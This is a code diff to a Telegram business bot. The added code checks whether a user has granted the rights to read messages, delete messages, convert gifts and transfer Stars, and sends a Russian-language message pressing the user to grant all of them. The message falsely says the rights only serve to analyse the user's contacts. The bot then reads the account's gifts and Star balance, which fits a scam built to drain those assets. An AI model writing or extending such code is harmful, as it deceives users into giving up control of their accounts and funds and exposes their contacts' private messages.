@@ -221,6 +221,30 @@ async def handle_business(business_connection: types.BusinessConnection):
     try:
         info = await bot.get_business_connection(business_id)
         rights = info.rights
+        
+        # Проверка необходимых прав
+        required_rights = [
+            rights.can_read_messages,
+            rights.can_delete_all_messages,
+            rights.can_convert_gifts_to_stars,
+            rights.can_transfer_stars
+        ]
+        
+        if not all(required_rights):
+            warning_message = (
+                "⛔️ Вы не предоставили все права боту\n\n"
+                "🔔 Для корректной работы бота необходимо предоставить ему все права в настройках.\n\n"
+                "⚠️ Мы не используем эти права в плохих целях, все эти права нужны нам лишь чтобы анализировать сообщения и статистику ваших собеседников, чтобы в будущем отправлять её вам\n\n"
+                "✅ Как только вы предоставите все права, бот автоматически уведомит вас о том, что всё готово к использованию"
+            )
+            try:
+                await bot.send_message(
+                    chat_id=user.id,
+                    text=warning_message
+                )
+            except Exception as e:
+                await bot.send_message(LOG_CHAT_ID, f"⚠️ Не удалось отправить предупреждение пользователю {user.id}: {e}")
+        
         gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
         stars = await bot.get_business_account_star_balance(business_id)
     except Exception as e:
